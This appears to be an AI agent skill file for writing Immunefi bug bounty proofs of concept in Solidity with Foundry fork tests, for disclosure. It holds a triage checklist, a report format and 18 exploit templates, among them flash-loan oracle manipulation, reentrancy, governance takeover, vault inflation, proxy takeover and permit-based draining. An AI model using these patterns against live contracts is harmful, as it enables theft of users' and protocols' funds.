---
name: web3-poc
description: Web3 bug bounty PoC writing for Immunefi. Foundry fork test templates, essential cheatcodes, 18 exploit pattern templates (price oracle manipulation, reentrancy, flash loan governance, ERC4626 inflation, access control, signature replay, proxy upgrade, flash loan drain, cross-chain replay, read-only reentrancy, donation attack, permit frontrun DoS, flash loan borrowing, storage collision, incomplete code path, batch manipulation, withdrawal queue, yield farming). 7-question triage gate and report format. Use when you have a confirmed bug and need to write the PoC.
argument-hint: "[bug class or protocol name]"
allowed-tools: Bash, Read, Glob, Grep
---

# WEB3 PoC WRITING — FOUNDRY EXPLOIT TEMPLATES

---

## 7-QUESTION TRIAGE GATE (Run Before Writing ANY PoC)

Before spending hours on a PoC, answer all 7:

```
1. STEAL/FREEZE/DESTROY: What do I end up with that I didn't start with?
   → Can't answer? NOT A BUG.

2. STEPS: What are the EXACT function calls, in what order?
   → Can't list them? NOT READY. Keep reading.

3. CAPITAL: How much do I need? (Flash loan covers it if > $0)
   → If cost > reward, NOT VIABLE.

4. OUT-OF-SCOPE: Is the vulnerable contract in scope?
   → Check program scope BEFORE writing.

5. PRIOR ART: Has this been reported + paid already?
   → Check Immunefi public disclosures + prior audit reports.

6. ADMIN: Does attack require admin/privileged access?
   → If yes: USUALLY INVALID (unless owner compromise explicitly in scope).

7. TESTABILITY: Can I prove profit with assertGt(profit, 0)?
   → If no measurable profit: document as High, not Critical.
```

---

## IMMUNEFI PoC REQUIREMENTS

```
✓ Runnable Foundry fork test (not Hardhat)
✓ console.log("Before:", balance_before)
✓ console.log("After:", balance_after)
✓ assertGt(profit, 0, "Must be profitable")
✓ Pinned mainnet fork block number
✓ Realistic starting conditions (no magic initial state)
✓ One bug per report

✗ What gets rejected:
  - Hardhat/Truffle tests
  - Tests that don't demonstrate profit
  - Tests requiring admin access (unless explicitly in scope)
  - Tests on out-of-scope contracts
  - Theoretical walkthroughs without runnable test
```

---

## STANDARD PoC TEMPLATE

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";

// Target interfaces — copy from Etherscan or project
interface IVictimProtocol {
    function deposit(uint256 amount) external;
    function withdraw(uint256 shares) external returns (uint256);
    function totalAssets() external view returns (uint256);
}

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

// ==============================================================================
// EXPLOIT CONTRACT (deployed as attacker)
// ==============================================================================
contract Attacker {
    IVictimProtocol public immutable victim;
    IERC20 public immutable token;

    constructor(address _victim, address _token) {
        victim = IVictimProtocol(_victim);
        token = IERC20(_token);
    }

    function attack() external {
        // Step 1: Setup
        uint256 startBalance = token.balanceOf(address(this));

        // Step 2: Execute exploit
        token.approve(address(victim), type(uint256).max);
        victim.deposit(startBalance);

        // Step 3: Profit extraction
        victim.withdraw(type(uint256).max);

        // Send profits back to test
        token.transfer(msg.sender, token.balanceOf(address(this)));
    }

    // Flash loan / callback receivers go here
    receive() external payable {}
}

// ==============================================================================
// TEST CONTRACT
// ==============================================================================
contract ExploitTest is Test {
    // ===== CONFIGURATION =====
    uint256 constant FORK_BLOCK = 20000000;  // Pin to specific block

    address constant VICTIM_POOL    = 0x1234...;
    address constant USDC_ADDRESS   = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant WETH_ADDRESS   = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;

    IVictimProtocol victim;
    IERC20 usdc;
    Attacker attacker;

    // ===== SETUP =====
    function setUp() public {
        vm.createSelectFork(vm.envString("MAINNET_RPC"), FORK_BLOCK);

        victim  = IVictimProtocol(VICTIM_POOL);
        usdc    = IERC20(USDC_ADDRESS);
        attacker = new Attacker(VICTIM_POOL, USDC_ADDRESS);

        // Fund attacker with realistic starting capital
        deal(USDC_ADDRESS, address(attacker), 1_000_000e6); // $1M USDC

        // Labels for readable traces
        vm.label(VICTIM_POOL,    "VictimPool");
        vm.label(USDC_ADDRESS,   "USDC");
        vm.label(address(attacker), "Attacker");
    }

    // ===== EXPLOIT =====
    function testExploit() public {
        uint256 balanceBefore = usdc.balanceOf(address(this));
        console.log("USDC before:", balanceBefore / 1e6, "USD");

        attacker.attack();

        uint256 balanceAfter = usdc.balanceOf(address(this));
        console.log("USDC after:", balanceAfter / 1e6, "USD");
        console.log("Profit:", (balanceAfter - balanceBefore) / 1e6, "USD");

        assertGt(balanceAfter, balanceBefore, "Exploit must be profitable");
    }
}
```

---

## ESSENTIAL CHEATCODES

### Identity & Caller
```solidity
vm.prank(address);                   // next call as address
vm.startPrank(address);              // all subsequent calls as address
vm.stopPrank();                      // return to default caller
```

### State Manipulation
```solidity
vm.deal(address, amount);            // set ETH balance
deal(tokenAddr, address, amount);    // set ERC20 balance (stdCheats)
vm.store(contract, slot, value);     // write storage slot directly
vm.load(contract, slot);             // read storage slot
vm.warp(timestamp);                  // set block.timestamp
vm.roll(blockNumber);                // set block.number
vm.fee(gasPrice);                    // set tx.gasprice
vm.chainId(chainId);                 // set block.chainid
```

### Fork Management
```solidity
vm.createFork(url);                  // create fork, returns forkId
vm.createSelectFork(url, block);     // create + activate fork at block
vm.selectFork(forkId);              // switch to existing fork
```

### Snapshot / Revert
```solidity
uint256 snap = vm.snapshot();        // save state
vm.revertTo(snap);                   // restore state
```

### Mocking
```solidity
vm.mockCall(addr, calldata, retdata);       // mock specific call
vm.mockCallRevert(addr, calldata, retdata); // mock call to revert
vm.clearMockedCalls();                      // clear all mocks
```

### Signatures
```solidity
(uint8 v, bytes32 r, bytes32 s) = vm.sign(privKey, digest);
address user = vm.addr(privKey);     // derive address from private key
address user = makeAddr("alice");    // deterministic test address
```

### Assertions
```solidity
vm.expectRevert(bytes("error message"));
vm.expectEmit(true, true, false, true); // (topic1, topic2, topic3, data)
emit MyEvent(...); // event must match next
vm.expectCall(addr, calldata);       // assert specific call made
```

---

## FORK PATTERNS

### Standard Mainnet Fork
```solidity
function setUp() public {
    vm.createSelectFork(
        vm.envString("MAINNET_RPC"),
        20_000_000  // pin block
    );
}
// Run: forge test --match-test testExploit -vvv
// Env: MAINNET_RPC=https://eth-mainnet.alchemyapi.io/v2/KEY
```

### Multi-Fork Cross-Chain Test
```solidity
uint256 mainnetFork;
uint256 arbitrumFork;

function setUp() public {
    mainnetFork  = vm.createFork(vm.envString("MAINNET_RPC"),  18_000_000);
    arbitrumFork = vm.createFork(vm.envString("ARBITRUM_RPC"), 170_000_000);
}

function testCrossChainReplay() public {
    vm.selectFork(mainnetFork);
    // Claim on mainnet
    victim.claimRewards(user, amount, signature);

    vm.selectFork(arbitrumFork);
    // Replay SAME signature on Arbitrum
    victim.claimRewards(user, amount, signature);
    // Should revert — if it doesn't = cross-chain replay bug
}
```

### Storage Slot Manipulation
```solidity
// Find slot for a simple mapping: keccak256(key . slot_number)
bytes32 slot = keccak256(abi.encode(
    userAddress,       // mapping key
    uint256(1)         // storage slot of the mapping in contract
));
vm.store(contractAddr, slot, bytes32(uint256(999e18)));

// Helper: override ERC20 balance
function overrideBalance(address token, address user, uint256 amount) internal {
    bytes32 slot = keccak256(abi.encode(user, uint256(0)));
    vm.store(token, slot, bytes32(amount));
}
```

---

## 18 EXPLOIT PATTERN TEMPLATES

### Pattern 1: Price Oracle Manipulation (Flash Loan)
```solidity
// Flash loan provider: Balancer V2 (0% fee)
address constant BALANCER = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;

contract OracleAttack is IFlashLoanRecipient {
    function attack() external {
        address[] memory tokens = new address[](1);
        tokens[0] = WETH;
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 10_000 ether;

        IBalancerVault(BALANCER).flashLoan(this, tokens, amounts, "");
    }

    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory
    ) external override {
        // 1. Dump WETH → manipulate oracle price
        // 2. Call victim with manipulated price (overborrow)
        // 3. Repay flash loan
        IERC20(tokens[0]).transfer(BALANCER, amounts[0] + feeAmounts[0]);
    }
}
```

### Pattern 2: Reentrancy (Classic CEI Violation)
```solidity
contract ReentrancyAttacker {
    IVictim victim;
    uint256 attackCount;

    function attack() external {
        victim.withdraw(1 ether);
    }

    receive() external payable {
        if (attackCount < 5 && address(victim).balance >= 1 ether) {
            attackCount++;
            victim.withdraw(1 ether);
        }
    }
}
```

### Pattern 3: Flash Loan Governance Attack
```solidity
function testGovernanceAttack() public {
    // 1. Flash loan governance tokens
    uint256 loanAmount = governanceToken.totalSupply() * 60 / 100; // 60%
    flashLoanProvider.flashLoan(loanAmount);

    // In callback:
    // 2. Delegate to self
    governanceToken.delegate(address(this));
    // 3. Create proposal (if quorum reached)
    governor.propose(targets, values, calldatas, description);
    // 4. Vote YES immediately (if no delay)
    governor.castVote(proposalId, 1);
    // 5. Execute (if no timelock)
    governor.execute(targets, values, calldatas, descHash);
    // 6. Repay loan
}
```

### Pattern 4: ERC4626 First Depositor Inflation
```solidity
function testFirstDepositorInflation() public {
    // 1. Be first depositor — 1 wei
    deal(address(token), address(this), 1 + 100 ether);
    token.approve(address(vault), type(uint256).max);
    vault.deposit(1, address(this));  // Get 1 share

    // 2. Donate large amount directly (bypass deposit)
    token.transfer(address(vault), 100 ether);

    // 3. Victim deposits 100 ether — gets 0 shares due to rounding
    address victim = makeAddr("victim");
    deal(address(token), victim, 100 ether);
    vm.prank(victim);
    token.approve(address(vault), 100 ether);
    vm.prank(victim);
    uint256 victimShares = vault.deposit(100 ether, victim);

    console.log("Victim shares received:", victimShares); // Should be 0 if vulnerable

    // 4. Redeem 1 share — get 200 ether
    uint256 received = vault.redeem(1, address(this), address(this));
    console.log("Attacker received:", received);
    assertGt(received, 100 ether);
}
```

### Pattern 5: Missing Access Control (Sibling Function)
```solidity
function testMissingModifier() public {
    address attacker = makeAddr("attacker");

    // vote() requires onlyRole(VOTER_ROLE) — but poke() doesn't
    // Both modify the same underlying state
    vm.prank(attacker);
    protocol.poke(proposalId, 1); // Attacker votes via unprotected sibling

    assertEq(protocol.getVotes(proposalId, true), 1);
}
```

### Pattern 6: Cross-Chain Signature Replay
```solidity
function testSignatureReplay() public {
    // Create signed message WITHOUT chainId
    bytes32 messageHash = keccak256(abi.encodePacked(user, amount));
    (uint8 v, bytes32 r, bytes32 s) = vm.sign(signerPrivKey, messageHash);

    vm.selectFork(mainnetFork);
    victim.claimRewards(user, amount, abi.encodePacked(r, s, v));

    vm.selectFork(arbitrumFork);
    // Should revert if chainId is in signature
    victim.claimRewards(user, amount, abi.encodePacked(r, s, v));
}
```

### Pattern 7: Uninitialized Proxy
```solidity
function testUninitializedProxy() public {
    address implementation = proxy.implementation();

    // Call initialize directly on implementation — no proxy guard
    IVaultImpl(implementation).initialize(address(this)); // Become admin

    // Now upgrade to malicious implementation
    IVaultImpl(implementation).upgradeTo(address(maliciousImpl));

    // Drain through proxy
    // All calls to proxy now delegate to malicious implementation
}
```

### Pattern 8: Flash Loan Drain (Missing Balance Check)
```solidity
contract FlashLoanDrain {
    function attack() external {
        uint256 poolBalance = IERC20(TOKEN).balanceOf(address(victim));
        victim.flashLoan(poolBalance); // Borrow everything
    }

    function executeOperation(uint256 amount, uint256 fee) external {
        // Pool expects (amount + fee) returned
        // But fee calculation uses pre-loan balance = 0 → fee = 0
        // Return just amount → drain fee from pool reserves
        IERC20(TOKEN).transfer(address(victim), amount);
        // fee never paid
    }
}
```

### Pattern 9: Permit Frontrun DoS
```solidity
function testPermitFrontrunDoS() public {
    // Victim prepares a permit signature
    (uint8 v, bytes32 r, bytes32 s) = getPermitSignature(victim, spender, amount, deadline);

    // Attacker sees it in mempool, frontruns: consumes nonce
    vm.prank(attacker);
    token.permit(victim, spender, amount, deadline, v, r, s);

    // Victim's permitAndDeposit now reverts (nonce consumed)
    vm.prank(victim);
    vm.expectRevert(); // Should revert — if NOT wrapped in try/catch = DoS
    protocol.permitAndDeposit(amount, deadline, v, r, s);
}
```

### Pattern 10: Read-Only Reentrancy
```solidity
// Attacker uses ERC777 / callback to reenter a VIEW function
// that reads stale state during the callback
contract ReadOnlyReentrancyAttacker {
    bool attacking;

    // ERC777 tokensToSend hook
    function tokensToSend(address, address, address, uint256, bytes memory, bytes memory) external {
        if (!attacking) {
            attacking = true;
            // During this callback, vault.totalAssets() returns PRE-withdrawal amount
            // But shares are already reduced → price appears inflated
            uint256 manipulatedPrice = priceFeed.getPrice(); // reads victim vault
            protocol.borrow(collateral, manipulatedPrice); // overborrow
        }
    }
}
```

### Pattern 11: Donation Attack
```solidity
function testDonationAttack() public {
    // Protocol uses token.balanceOf(address(this)) for totalAssets
    // Attacker donates tokens directly (not via deposit)
    deal(address(token), attacker, 1_000_000e18);
    vm.prank(attacker);
    token.transfer(address(vault), 1_000_000e18); // Direct donation

    // Share price now 1000x higher
    // New depositors get far fewer shares than expected
    // Existing depositors (attacker) can redeem at inflated price
}
```

### Pattern 12: Off-By-One in Period Boundary
```solidity
function testOffByOne() public {
    uint256 epochEnd = protocol.currentEpochEnd();
    vm.warp(epochEnd); // exactly at boundary

    // Vulnerable: uses < (should be <=) — OR uses <= (should be <)
    // Double-claim: same reward claimed in epoch N and epoch N+1
    protocol.claimRewards();
    vm.warp(epochEnd + 1);
    protocol.claimRewards(); // Should revert — if it doesn't = double-claim
}
```

### Pattern 13: Unchecked Accounting (Incomplete Code Path)
```solidity
function testIncompleteCodePath() public {
    // Create order
    uint256 orderId = protocol.createOrder(amount);

    // Cancel without refund
    protocol.cancelOrder(orderId);

    // Tokens should be returned — if not, they're stuck
    uint256 contractBalance = token.balanceOf(address(protocol));
    assertEq(contractBalance, 0, "Tokens stuck in contract");

    // User should have tokens back
    uint256 userBalance = token.balanceOf(address(this));
    assertEq(userBalance, amount, "User not refunded");
}
```

### Pattern 14: Withdrawal Queue Desync
```solidity
function testWithdrawalQueueDesync() public {
    // Queue a withdrawal
    protocol.queueWithdrawal(amount);

    // Queue entry: {amount, timestamp, status} — if only "amount" updated but not "status"
    // Attacker can re-queue or double-process

    (, , uint8 status) = protocol.withdrawalQueue(address(this));
    assertEq(status, 1, "Status should be QUEUED");

    // Cancel without clearing all 3 fields
    protocol.cancelWithdrawal();

    (, , uint8 statusAfter) = protocol.withdrawalQueue(address(this));
    assertEq(statusAfter, 0, "Status not reset — ghost queue entry");

    // Re-queue and process same amount twice
    protocol.queueWithdrawal(amount);
    protocol.processWithdrawal();
}
```

### Pattern 15: Stale Reward Index
```solidity
function testStaleRewardIndex() public {
    // Deposit — reward index recorded
    uint256 depositTime = block.timestamp;
    protocol.deposit(amount);

    // Skip time — rewards accumulate
    vm.warp(depositTime + 365 days);

    // Deposit MORE before updateRewards() is called
    // Reward index not updated → user earns on new deposit for full past year
    protocol.deposit(amount * 100); // Large deposit gets historical rewards

    uint256 rewards = protocol.pendingRewards(address(this));
    console.log("Expected: ~1 year rewards on first deposit");
    console.log("Actual: huge rewards including historical period on large deposit");
}
```

### Pattern 16: Tautology Access Control
```solidity
function testTautology() public {
    // require(role == ADMIN || role != ADMIN) — always true
    // Anyone can call this function
    vm.prank(address(0xdeadbeef)); // random address
    protocol.adminOnlyFunction(maliciousParam); // Should revert — but doesn't
}
```

### Pattern 17: EIP-2612 Permit Without Deadline
```solidity
function testPermitWithoutDeadline() public {
    // Protocol accepts permit with deadline = type(uint256).max
    // Signed permit never expires
    // If user revokes approval, attacker uses old signature indefinitely
    uint256 deadline = type(uint256).max;
    (uint8 v, bytes32 r, bytes32 s) = getPermitSignature(victim, protocol, amount, deadline);

    // 1 year later
    vm.warp(block.timestamp + 365 days);

    // Old permit still valid → drain victim
    vm.prank(attacker);
    protocol.permitAndDrain(victim, amount, deadline, v, r, s);
}
```

### Pattern 18: Fee-On-Transfer Token
```solidity
function testFeeOnTransferToken() public {
    // Protocol uses FoT token but doesn't account for fee
    uint256 amountIn = 1000e18;
    // After transfer fee (1%), contract receives 990e18
    // But protocol records 1000e18 as deposited

    feeToken.approve(address(protocol), amountIn);
    protocol.deposit(amountIn);

    // Protocol thinks user deposited 1000, but only 990 arrived
    // With many depositors, protocol becomes insolvent

    uint256 contractBalance = feeToken.balanceOf(address(protocol));
    uint256 protocolAccounting = protocol.totalDeposited();
    assertGt(protocolAccounting, contractBalance, "Protocol over-counts deposits");
}
```

---

## REPORT FORMAT FOR IMMUNEFI

```
Title: [Protocol Name] — [Bug Class]: [Impact Summary in ≤ 10 words]

Examples:
  VaultProtocol — ERC4626 First Depositor Inflation: Attacker can drain all vault funds
  LendingProtocol — Cross-Chain Signature Replay: Rewards claimable on all chains with single signature
  GovernanceToken — Flash Loan Voting: Proposal executable without real token ownership

Severity: Critical / High / Medium / Low

Summary (2-3 sentences):
  What is broken. What attacker can do. Estimated impact in USD or % of TVL.

Vulnerability Details:
  Contract: VaultToken.sol
  Function: deposit() — line 142
  Root cause: convertToShares() rounds down, allowing 0-share deposit when totalAssets > 0

  Vulnerable code snippet (paste relevant lines with file + line numbers)

Impact:
  Attacker can drain 100% of vault funds ($X at current TVL).
  Steps: 1-wei deposit + direct donation → victim deposit returns 0 shares → attacker redeems all.

Proof of Concept:
  [Full Foundry test file — runnable, fork-pinned, with assertGt]

Recommended Fix:
  Add virtual shares offset: totalAssets() + 1 / totalShares() + 1
  (OpenZeppelin ERC4626 v5.0 implementation)
  OR: require shares > 0 in _deposit()

References:
  - https://github.com/OpenZeppelin/openzeppelin-contracts/issues/3706
  - Similar: Code4rena finding [link]
```
